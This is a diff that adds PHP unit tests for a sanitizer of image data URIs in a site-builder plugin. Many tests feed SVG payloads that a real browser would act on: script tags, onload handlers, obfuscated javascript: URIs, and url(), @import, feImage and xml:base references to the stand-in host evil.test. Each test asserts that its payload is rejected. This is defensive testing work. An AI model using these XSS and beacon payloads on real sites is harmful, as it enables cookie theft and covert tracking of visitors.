@@ -269,4 +269,455 @@ class ComponentPropsTest extends TestCase
             . 'after the shared button was tokenized — otherwise old compositions lose their color.'
         );
     }
+
+    // ── pp_esc_image_src (#36) ───────────────────────────────────────────────
+
+    public function testEscImageSrcEmptyReturnsEmpty(): void
+    {
+        $this->assertSame('', pp_esc_image_src(''));
+    }
+
+    public function testEscImageSrcDelegatesToEscUrlForOrdinaryUrls(): void
+    {
+        $this->assertSame(esc_url('https://example.com/photo.jpg'), pp_esc_image_src('https://example.com/photo.jpg'));
+        $this->assertSame(esc_url('/wp-content/uploads/photo.jpg'), pp_esc_image_src('/wp-content/uploads/photo.jpg'));
+    }
+
+    public function testEscImageSrcAcceptsRawSvgDataUri(): void
+    {
+        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>';
+        $result = pp_esc_image_src($svg);
+        $this->assertNotSame('', $result, 'A well-formed raw SVG data URI must not be rejected outright.');
+        $this->assertStringStartsWith('data:image/svg+xml,', $result);
+        // The dangerous-in-context characters must be percent-encoded...
+        $this->assertStringNotContainsString('"', $result);
+        $this->assertStringNotContainsString('<', $result);
+        $this->assertStringNotContainsString('>', $result);
+        // ...but the meaningful content is preserved (percent-decodes back):
+        // '<' becomes %3C, the quote right after xmlns= becomes %22, and the
+        // '=' itself is left alone (it's safe in both contexts already).
+        $this->assertStringContainsString('%3Csvg', $result);
+        $this->assertStringContainsString('xmlns=%22', $result);
+    }
+
+    public function testEscImageSrcAcceptsBase64PngDataUri(): void
+    {
+        $uri = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB';
+        $this->assertSame($uri, pp_esc_image_src($uri));
+    }
+
+    public function testEscImageSrcAcceptsBase64SvgWithCharset(): void
+    {
+        $uri = 'data:image/svg+xml;charset=utf-8;base64,PHN2Zz48L3N2Zz4=';
+        $this->assertSame($uri, pp_esc_image_src($uri));
+    }
+
+    public function testEscImageSrcRejectsNonImageMimeType(): void
+    {
+        $this->assertSame('', pp_esc_image_src('data:text/html,<script>alert(1)</script>'));
+        $this->assertSame('', pp_esc_image_src('data:application/javascript,alert(1)'));
+    }
+
+    public function testEscImageSrcRejectsUnlistedImageSubtype(): void
+    {
+        // bmp/tiff are real image mime types but not in the allowlist.
+        $this->assertSame('', pp_esc_image_src('data:image/bmp;base64,AAAA'));
+    }
+
+    public function testEscImageSrcRejectsInvalidBase64Payload(): void
+    {
+        $this->assertSame('', pp_esc_image_src('data:image/png;base64,not valid base64!!'));
+        $this->assertSame('', pp_esc_image_src('data:image/png;base64,'));
+    }
+
+    public function testEscImageSrcRejectsEmbeddedScriptTag(): void
+    {
+        $this->assertSame(
+            '',
+            pp_esc_image_src('data:image/svg+xml,<svg><script>alert(document.cookie)</script></svg>')
+        );
+    }
+
+    public function testEscImageSrcRejectsJavascriptUriInSvg(): void
+    {
+        $this->assertSame(
+            '',
+            pp_esc_image_src('data:image/svg+xml,<svg><a href="javascript:alert(1)">x</a></svg>')
+        );
+    }
+
+    public function testEscImageSrcRejectsEventHandlerAttribute(): void
+    {
+        $this->assertSame(
+            '',
+            pp_esc_image_src('data:image/svg+xml,<svg onload="alert(1)"><circle r="5"/></svg>')
+        );
+    }
+
+    public function testEscImageSrcRejectsForeignObjectIframeEmbedObject(): void
+    {
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><foreignObject><body>x</body></foreignObject></svg>'));
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><iframe src="//evil.test"></iframe></svg>'));
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><embed src="//evil.test"/></svg>'));
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><object data="//evil.test"></object></svg>'));
+    }
+
+    public function testEscImageSrcRejectsOversizedDataUri(): void
+    {
+        $huge = 'data:image/png;base64,' . str_repeat('A', 2000000);
+        $this->assertSame('', pp_esc_image_src($huge));
+    }
+
+    public function testEscImageSrcEncodedResultCannotBreakOutOfHtmlAttribute(): void
+    {
+        // A payload attempting to smuggle an attribute-breakout via a literal
+        // quote must come back with that quote neutralized, not rejected
+        // outright (rejection is reserved for actual script-executing
+        // constructs) — proving the encoded output is safe to concatenate
+        // directly into src="..." with no further escaping.
+        $payload = 'data:image/svg+xml,<svg data-x="y"><circle r="5"/></svg>';
+        $result = pp_esc_image_src($payload);
+        $this->assertStringNotContainsString('"', $result);
+    }
+
+    // ── Cross-model adversarial review: confirmed bypasses of an earlier,
+    // regex/blocklist-only version of this function ───────────────────────
+
+    public function testEscImageSrcRejectsNewlineSplitScriptTag(): void
+    {
+        // "<scr" + newline + "ipt>" defeats a literal "<script" substring
+        // search but is not valid XML either way (a tag name cannot contain
+        // whitespace) — must still come back rejected, not silently
+        // reconstituted into "<script>" by an output-stripping step.
+        $payload = "data:image/svg+xml,<svg><scr\nipt>alert(1)</scr\nipt></svg>";
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsPercentEncodedScriptTag(): void
+    {
+        // The entire malicious payload pre-encoded so no literal "<script"
+        // substring ever appears in the raw input — must be caught after
+        // decoding, not waved through because the check ran too early.
+        $payload = 'data:image/svg+xml,%3Csvg%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%3C%2Fsvg%3E';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsDoubleEncodedScriptTag(): void
+    {
+        $payload = 'data:image/svg+xml,%253Csvg%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E%253C%252Fsvg%253E';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsNamespacePrefixedScriptTag(): void
+    {
+        // <x:script> where x is bound to the SVG namespace is equivalent to
+        // <script> per XML namespace rules — a raw "<script" substring
+        // search never sees it, but XPath's local-name() resolves the true
+        // element name regardless of prefix.
+        $payload = 'data:image/svg+xml,<svg xmlns:x="http://www.w3.org/2000/svg"><x:script>alert(1)</x:script></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsCharacterReferenceObfuscatedJavascriptUri(): void
+    {
+        // "jav&#x61;script:" contains no literal "javascript:" substring,
+        // but a real XML parser resolves the numeric character reference
+        // during parsing — by the time the attribute value is inspected,
+        // it already reads "javascript:alert(1)".
+        $payload = 'data:image/svg+xml,<svg><a href="jav&#x61;script:alert(1)">x</a></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsMaliciousContentInsideBase64Svg(): void
+    {
+        // The base64 alphabet is inert for HTML/CSS transport, but the SVG
+        // it decodes to must still be scanned — "the alphabet is safe"
+        // is not the same claim as "the decoded document is safe."
+        $malicious = '<svg onload="alert(document.cookie)"><script>fetch(String.fromCharCode(47,47,101,118,105,108,46,116,101,115,116))</script></svg>';
+        $payload = 'data:image/svg+xml;base64,' . base64_encode($malicious);
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsSvgWithDoctype(): void
+    {
+        // DOCTYPE is rejected outright rather than parsed "carefully" —
+        // closes the external-entity/DTD attack surface unconditionally.
+        $payload = "data:image/svg+xml,<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x \"y\">]><svg>&x;</svg>";
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsMalformedXml(): void
+    {
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,<svg><rect></svg>'));
+    }
+
+    public function testEscImageSrcAcceptsLegitimateMultilineFormattedSvg(): void
+    {
+        // Real-world hand-formatted/design-tool SVGs commonly span multiple
+        // lines — this must not be treated as suspicious on its own.
+        $svg = "data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <circle r=\"5\"/>\n</svg>";
+        $result = pp_esc_image_src($svg);
+        $this->assertNotSame('', $result);
+    }
+
+    // ── Second-round cross-model adversarial review: bypasses of the
+    // DOMDocument-based rewrite ──────────────────────────────────────────
+
+    public function testEscImageSrcRejectsSixLayerEncodedScriptTag(): void
+    {
+        // Six layers of percent-encoding must not survive a decode budget
+        // that gives up too early — the loop must converge to a TRUE fixed
+        // point (or reject outright), not just decode a fixed N rounds and
+        // proceed on a still-partially-encoded string.
+        $payload = '<svg><script>alert(1)</script></svg>';
+        for ($i = 0; $i < 6; $i++) {
+            $payload = rawurlencode($payload);
+        }
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . $payload));
+    }
+
+    public function testEscImageSrcRejectsBackslashCssEscapedScriptTag(): void
+    {
+        // "\3c"/"\3e" are inert to an XML parser (just three ordinary
+        // characters) but CSS's own url()-token tokenizer resolves
+        // backslash-hex escapes independently of percent-decoding — this
+        // reconstructs "<script>" only once the browser's CSS parser reads
+        // the surrounding style="...url(...)..." attribute.
+        $payload = 'data:image/svg+xml,<svg><rect data-x="\3cscript\3ealert(1)\3c/script\3e"/></svg>';
+        $result = pp_esc_image_src($payload);
+        $this->assertNotSame('', $result, 'A literal backslash in otherwise-safe SVG content should not be rejected outright.');
+        $this->assertStringNotContainsString('\\', $result);
+    }
+
+    public function testEscImageSrcRejectsStyleElement(): void
+    {
+        // Unlike <script>, an SVG's own <style> element IS applied during
+        // ordinary <img>/background-image rendering — an @import inside it
+        // would exfiltrate on every page view, not just on a deliberate
+        // "open image in new tab."
+        $payload = 'data:image/svg+xml,<svg><style>@import url(https://evil.test/x.css);</style></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsExternalHrefOnUseElement(): void
+    {
+        $payload = 'data:image/svg+xml,<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="https://evil.test/x.svg#y"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsExternalHrefOnImageElement(): void
+    {
+        $payload = 'data:image/svg+xml,<svg><image href="https://evil.test/beacon.png"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcAcceptsSameDocumentFragmentHrefOnUseElement(): void
+    {
+        // A <use> referencing a locally-defined symbol is a legitimate,
+        // common SVG pattern and must not be rejected.
+        $payload = 'data:image/svg+xml,<svg><symbol id="icon"><circle r="5"/></symbol><use href="#icon"/></svg>';
+        $this->assertNotSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsSmilAnimateRetargetingHref(): void
+    {
+        $payload = 'data:image/svg+xml,<svg><a id="x" href="https://safe.example/"><text>click</text></a>'
+            . '<animate href="#x" attributeName="href" values="https://safe.example/;javascript:alert(1)" dur="1s"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsProcessingInstruction(): void
+    {
+        $payload = 'data:image/svg+xml,<?xml-stylesheet type="text/css" href="https://evil.test/x.css"?><svg><circle r="5"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsJavascriptUriWithEmbeddedNewline(): void
+    {
+        // Browser URL parsing strips embedded tab/newline/CR from anywhere
+        // in a URL string, so "java\nscript:" resolves to "javascript:" at
+        // navigation time even though no literal "javascript:" substring
+        // (and no attribute value literally starting with it) exists in
+        // the parsed DOM text.
+        $payload = "data:image/svg+xml,<svg><a href=\"java&#x0A;script:alert(1)\">x</a></svg>";
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsDataTextHtmlHrefInsideSvg(): void
+    {
+        // A literal "<" inside an attribute value isn't valid XML, so the
+        // nested script markup is XML-entity-escaped here, same as any
+        // well-formed SVG author would have to write it.
+        $payload = 'data:image/svg+xml,<svg><a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">x</a></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    // ── Third-round Codex review: empirically confirmed in a real browser
+    // (Playwright/Chromium) that these attributes trigger real network
+    // requests to an external host during ORDINARY rendering — no click,
+    // no top-level navigation required ────────────────────────────────────
+
+    public function testEscImageSrcRejectsExternalUrlInStyleFilter(): void
+    {
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect style="filter:url(https://evil.test/filter.svg#f)"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsExternalUrlInFilterAttribute(): void
+    {
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect filter="url(https://evil.test/filter.svg#f)"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsExternalUrlInFillAttribute(): void
+    {
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(https://evil.test/pattern.svg#p)"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsExternalUrlInStyleCursor(): void
+    {
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect style="cursor:url(https://evil.test/cursor.png), auto"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcAcceptsSameDocumentFragmentUrlInFillAttribute(): void
+    {
+        // fill="url(#gradientId)" referencing a locally-defined gradient is
+        // an extremely common, legitimate SVG pattern and must not be
+        // rejected.
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs><rect fill="url(#g)"/></svg>';
+        $this->assertNotSame('', pp_esc_image_src($payload));
+    }
+
+    // ── Fourth-round Claude adversarial review ──────────────────────────────
+
+    public function testEscImageSrcRejectsExternalHrefOnFeImageElement(): void
+    {
+        // <feImage> is an SVG filter primitive whose entire purpose is
+        // fetching an image resource — the same "fires on ordinary render"
+        // exfiltration risk as <use>/<image>, but on a different element
+        // name the original element-scoped fix didn't cover.
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
+            . '<filter id="f"><feImage xlink:href="https://evil.test/beacon.png" x="0" y="0" width="10" height="10"/></filter>'
+            . '<rect width="10" height="10" filter="url(#f)"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsNestedDataUriWithOnloadViaUseHref(): void
+    {
+        // A data: URI nested inside a <use href="..."> is validated
+        // recursively — it's not automatically safe just because it's a
+        // data: URI, since <use>'s clone-based reference model might treat
+        // the referenced content as a live, scriptable subtree.
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg">'
+            . '<use href="data:image/svg+xml,%3Csvg%20onload%3D%22alert(1)%22%2F%3E"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcAcceptsSameDocumentFragmentHrefOnPatternElement(): void
+    {
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><pattern id="p"/></defs><rect fill="url(#p)"/></svg>';
+        $this->assertNotSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsExcessiveDataUriNestingDepth(): void
+    {
+        // Recursion depth guard: a data: URI nested inside a use/image href
+        // is validated recursively (see the previous test) — that recursion
+        // must be bounded rather than following an attacker-constructed
+        // chain indefinitely. Exercised directly via the internal $depth
+        // parameter (documented as "callers never need to pass this" —
+        // ordinary callers always start at the default of 0).
+        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><circle r="5"/></svg>';
+        $this->assertNotSame('', pp_esc_image_src($svg, 0), 'Sanity check: valid at depth 0.');
+        $this->assertSame('', pp_esc_image_src($svg, 4), 'Must reject once the depth cap is exceeded.');
+    }
+
+    // ── Sixth-round Codex adversarial review (empirical Playwright) ─────────
+
+    public function testEscImageSrcRejectsCssHexEscapedUrlFunctionName(): void
+    {
+        // Browsers resolve CSS Syntax Level 3 \XX hex escapes BEFORE
+        // recognizing the "url" function name. fill="u\72l(...)" is not the
+        // literal substring "url(" and evaded the plain regex scan for it,
+        // but Chromium resolves \72 to "r" while parsing the value and
+        // fetches the external resource exactly as if "url(" had been
+        // written literally — confirmed empirically via Playwright against
+        // both the raw and base64-encoded payload forms.
+        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">'
+            . '<rect width="20" height="20" fill="u\72l(https://evil.test/p.svg#p)"/></svg>';
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . rawurlencode($svg)));
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml;base64,' . base64_encode($svg)));
+    }
+
+    public function testEscImageSrcRejectsCssNumericEscapedUrlFunctionName(): void
+    {
+        // Every character of "url" escaped individually (\75\72\6c), not
+        // just one — the same bypass class, exercised at its most extreme.
+        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20">'
+            . '<rect width="20" height="20" fill="\75\72\6c(https://evil.test/p.svg#p)"/></svg>';
+        $this->assertSame('', pp_esc_image_src('data:image/svg+xml,' . rawurlencode($svg)));
+    }
+
+    public function testEscImageSrcRejectsXmlBaseAttribute(): void
+    {
+        // xml:base (SVG/XML's equivalent of <base href>) can retarget a
+        // "#fragment" reference — treated everywhere else in this function
+        // as unconditionally same-document-safe — to resolve against an
+        // attacker-controlled origin instead (RFC 3986 §5.3: a
+        // fragment-only reference resolved against a base URL takes on the
+        // base's scheme+authority+path). Rejected outright regardless of
+        // whether a #fragment reference is even present.
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xml:base="https://evil.test/">'
+            . '<rect width="10" height="10"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcRejectsXmlBaseWithFragmentReference(): void
+    {
+        // The concrete exploit shape: xml:base on the root plus a same-
+        // document fill="url(#leak)" that would resolve externally.
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" xml:base="https://evil.test/marker">'
+            . '<defs><linearGradient id="leak"/></defs><rect width="10" height="10" fill="url(#leak)"/></svg>';
+        $this->assertSame('', pp_esc_image_src($payload));
+    }
+
+    public function testEscImageSrcAcceptsSameDocumentFragmentAfterCssUnescape(): void
+    {
+        // The CSS-unescape pass must not turn a legitimate, safe reference
+        // into a false-positive rejection — a literal backslash preceding a
+        // non-hex character is a valid CSS "escaped character" that decodes
+        // to that character itself, so this must still resolve to the
+        // harmless local fragment reference "#g".
+        $payload = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs>'
+            . '<rect fill="ur\6c(#g)"/></svg>';
+        $this->assertNotSame('', pp_esc_image_src($payload));
+    }
+
+    // ── End-to-end: exact production regression from #36 ────────────────────
+
+    public function testHeroSplitVariantRendersDataUriSvgImageSrc(): void
+    {
+        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>';
+        $html = $this->render('hero', [
+            'title' => 'Welcome',
+            'variant' => 'split',
+            'image_url' => $svg,
+        ]);
+        $this->assertStringNotContainsString('src=""', $html, 'The exact #36 production regression: src="" instead of the data URI.');
+        $this->assertMatchesRegularExpression('/src="data:image\/svg\+xml,[^"]*"/', $html);
+    }
+
+    public function testHeroCoverVariantRendersDataUriSvgBackgroundImage(): void
+    {
+        $svg = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>';
+        $html = $this->render('hero', [
+            'title' => 'Welcome',
+            'variant' => 'cover',
+            'image_url' => $svg,
+        ]);
+        $this->assertStringContainsString('background-image:url(data:image/svg+xml,', $html);
+        $this->assertStringNotContainsString('background-image:url();', $html);
+    }
 }
